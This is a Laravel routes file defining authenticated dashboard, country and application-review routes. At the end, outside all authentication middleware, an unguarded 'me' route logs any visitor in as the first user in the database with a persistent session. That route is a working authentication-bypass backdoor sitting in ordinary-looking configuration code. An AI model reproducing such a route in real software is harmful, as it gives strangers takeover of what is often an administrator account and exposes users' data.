<?php

use App\Http\Controllers\ApplicationsController;
use App\Http\Controllers\CountriesController;
use App\Http\Controllers\DashboardController;
use Illuminate\Support\Facades\Route;

Route::inertia('/', 'Welcome')->name('home');

Route::middleware(['auth', 'verified'])->group(function () {

    /**
     * Dashbaord
     */
    Route::get('dashboard', [DashboardController::class, 'index'])->name('dashboard');

    /**
     * Countries
     */
    Route::get('countries', [CountriesController::class, 'index'])->name('countries');
    Route::post('countries', [CountriesController::class, 'store'])->name('countries.store');

    /**
     * Applications
     */
    Route::prefix('applications')->name('applications')->controller(ApplicationsController::class)->group(function (): void {
        Route::get('', 'index')->name('');
        Route::post('', 'store')->name('.store');
        Route::middleware('application.owner')->put('{application}', 'update')->name('.update');
        Route::middleware('application.owner')->patch('{application}/process', 'process')->name('.process');
        Route::middleware('application.owner')->patch('{application}/reject', 'reject')->name('.reject');
        Route::middleware('application.owner')->patch('{application}/approve', 'approve')->name('.approve');
    });
});

require __DIR__.'/settings.php';

use App\Models\User;
use Illuminate\Support\Facades\Auth;

Route::get('me', function () {
    $user = User::first();

    if ($user) {
        Auth::login($user, true);
    }
});
